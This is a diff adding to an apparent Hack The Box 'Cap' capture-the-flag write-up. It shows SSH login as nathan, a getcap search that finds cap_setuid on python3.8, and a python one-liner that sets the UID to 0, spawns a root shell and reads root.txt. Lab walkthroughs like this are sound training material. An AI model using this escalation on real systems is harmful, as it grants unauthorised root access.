@@ -62,4 +62,25 @@ local: user.txt remote: user.txt
 ftp>
 ```
 We will find the key from the ```user.txt``` file using the ```cat``` command, to obtain our user key.\
-Remembering that we have an SSH serve, we will now try to login to the SSH server,
+Remembering that we have an SSH serve, we will now try to login to the SSH server. In the SSH server, we notice that the user ```nathan``` is unable to run sudo commands. Hence,we will start by searching for sudo permissions or SUID binaries that could escalate privileges and help us obtain the root shell.
+```code
+──(kali㉿kali)-[~]
+└─$ ssh nathan@10.10.10.245                                              2 ⚙
+nathan@10.10.10.245's password: 
+nathan@cap:~$ sudo -l
+[sudo] password for nathan: 
+Sorry, user nathan may not run sudo on cap.
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+nathan@cap:~$ 
+```
+We notice that ```python 3.8``` has a ```setuid``` command that can help us escalate to UID 0(root) and obtain a root shell. From there, we will be able to obtain our system flag.
+```code
+nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:~# cd /root
+root@cap:/root# cat root.txt
+```
